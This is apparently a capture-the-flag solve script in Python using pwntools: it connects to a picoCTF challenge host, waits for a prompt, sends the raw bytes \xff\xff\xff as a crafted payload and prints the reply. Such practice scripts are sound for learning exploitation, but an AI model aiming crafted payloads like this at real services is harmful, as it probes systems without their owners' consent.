from pwn import *

# Connection details
host = "lonely-island.picoctf.net"
port = 58221 # Check your port to change

# Open connection
io = remote(host, port)

# Wait for the prompt
io.recvuntil(b"==> ")

# Payload: raw bytes
payload = b"\xff\xff\xff"

# Send payload
io.sendline(payload)

# Receive response
print(io.recvall().decode())